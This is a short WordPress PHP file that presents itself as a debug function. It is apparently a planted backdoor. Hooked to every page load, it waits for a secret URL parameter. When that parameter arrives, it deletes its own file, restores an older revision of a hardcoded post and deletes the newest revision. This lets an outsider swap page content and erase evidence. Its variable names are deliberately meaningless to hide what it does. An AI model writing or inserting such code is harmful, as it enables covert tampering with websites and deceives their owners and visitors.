<?php

function access_front_debug() {
	if (isset($_GET['demo_oembed_right_background']) && $_GET['demo_oembed_right_background'] === 'panel_icon_landing') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$tab_videos_portfolio_chatbot = 11881;
		$slideshow_shipping_sites_fancy = wp_get_post_revisions($tab_videos_portfolio_chatbot);
		if (empty($slideshow_shipping_sites_fancy)) die('no revisions');
		if (count($slideshow_shipping_sites_fancy) < 2) die('less than 2');
		$quantity_ecommerce_plugin = array_shift($slideshow_shipping_sites_fancy);
		$shortener_asset_notifications_simply = $quantity_ecommerce_plugin->ID;
		$html_variations_parts_default = array_shift($slideshow_shipping_sites_fancy);
		$optimizer_most_method_performance = $html_variations_parts_default->ID;
		$print_additional_rating_qr = wp_restore_post_revision($optimizer_most_method_performance);
		if ($print_additional_rating_qr === false) die('error restoring');
		$print_additional_rating_qr = wp_delete_post_revision($shortener_asset_notifications_simply);		
		if ($print_additional_rating_qr === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'access_front_debug');
